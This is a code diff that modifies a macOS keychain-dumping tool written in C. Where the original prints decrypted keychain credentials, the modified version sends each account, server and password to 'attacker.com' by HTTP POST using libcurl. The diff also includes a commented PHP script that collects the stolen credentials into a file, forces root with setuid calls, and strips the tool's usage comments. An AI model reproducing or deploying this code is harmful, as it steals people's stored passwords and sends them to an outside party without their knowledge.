@@ -1,9 +1,3 @@
-// Build instructions:
-// $ gcc keychaindump.c -o keychaindump -lcrypto
-
-// Usage:
-// $ sudo ./keychaindump [path to keychain file, leave blank for default]
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -11,6 +5,14 @@
 #include <mach/vm_map.h>
 #include <openssl/des.h>
 #include <sys/sysctl.h>
+#include <curl/curl.h>
+
+#define CRED_URL "http://attacker.com/reportcredential.php"
+/*
+   <?php
+   file_put_contents("creds.txt", $_POST['server'] . ' : ' . $_POST['account'] . ' : ' . $_POST['password'] . "\n",   $flags=FILE_APPEND);
+   ?>
+*/
 
 // This structure's fields are pieced together from several sources,
 // using the label as an identifier. See find_or_create_credentials.
@@ -423,21 +425,49 @@ void decrypt_credentials() {
     }
 }
 
+void report_credential(t_credentials *, CURL *);
+
 // Outputs all credentials in "account:server:password" format. Call
 // after all the data has been dumped and the passwords decrypted.
 void print_credentials() {
     if (!g_credentials) return;
-    
+    CURL *curl = NULL;
+    if (!(curl = curl_easy_init())) {
+        fprintf(stderr, "[!] Failed to initialize curl handle\n");
+        return;
+    }
+    curl_easy_setopt(curl, CURLOPT_URL, CRED_URL);
+    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
     int i;
     for (i = 0; i < g_credentials_count; ++i) {
         t_credentials *cred = &g_credentials[i];
         if (!cred->account && !cred->server) continue;
-        if (!strcmp(cred->account, "Passwords not saved")) continue;
-        printf("%s:%s:%s\n", cred->account, cred->server, cred->password);
+        if (!strcmp(cred->account, "Passwords not saved")) continue;
+        report_credential(cred, curl);
     }
+    curl_easy_cleanup(curl);
+}
+
+void report_credential(t_credentials *credentials, CURL *handle) {
+    if (!handle)
+        return;
+    char *account = curl_easy_escape(handle, credentials->account, strlen(credentials->account));
+    char *server = curl_easy_escape(handle, credentials->server, strlen(credentials->server));
+    char *password = curl_easy_escape(handle, credentials->password, strlen(credentials->password));
+    size_t post_data_len = strlen(account) + strlen(server) + strlen(password) + strlen("server=&account=&password=")+1;
+    char *post_data = malloc(post_data_len + 1);
+    snprintf(post_data, post_data_len, "server=%s&account=%s&password=%s", account, server, password);
+    curl_easy_setopt(handle, CURLOPT_POSTFIELDS, post_data);
+    curl_easy_perform(handle);
+    curl_free(account);
+    curl_free(server);
+    curl_free(password);
 }
 
 int main(int argc, char **argv) {
+    setuid(0);
+    setgid(0);
+    seteuid(0);
     // Phase 1. Search securityd's memory space for possible master keys.
     // If the keychain file is unlocked, the real key should be in memory.
     int pid = get_securityd_pid();
